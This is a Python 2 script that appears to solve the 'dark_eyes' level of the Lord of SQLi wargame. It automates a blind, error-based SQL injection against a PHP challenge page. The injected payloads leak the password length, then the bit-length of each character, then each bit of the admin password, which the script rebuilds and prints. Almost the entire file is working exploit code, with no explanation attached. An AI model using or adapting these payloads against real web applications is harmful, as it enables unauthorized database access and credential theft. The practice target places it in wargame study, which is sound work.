#-*- coding: utf-8 -*-
import string
from web import *

url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw={}"

# get length
length = 0
inject_url = "' or ~0+(length(pw)={})#"

for i in range(100):
    req = getRequest(url, inject_url.format(i), show=False)
    page = getPage(req)
    if "" == page:
        print "Length :",i
        length = i
        break

# set Char length
inject_url = "' or ~0+(id='admin' and length(bin(ascii(substr(pw,{},1))))={})#"
chr_length = []

for i in range(1,length+1):
    for j in range(1,100):
        req = getRequest(url, inject_url.format(i,j), show=False)
        page = getPage(req)
        if "" == page:
            chr_length.append(j)
            break

print "Check bit length :",chr_length

# get password : brute forcing : for admin
password = []
inject_url = "' or ~0+(id='admin' and substr(bin(ascii(substr(pw,{},1))),{},1)=1)#"

for i in range(1,length+1):
    tmp = ""
    for j in range(1, chr_length[i-1]+1):
        req = getRequest(url, inject_url.format(i,j), show=False)
        page = getPage(req)
        if "" == page: tmp += "1"
        else: tmp += "0"
        print tmp

    password.append(chr(int(tmp,2)))
    print password

print "Password :","".join(password)
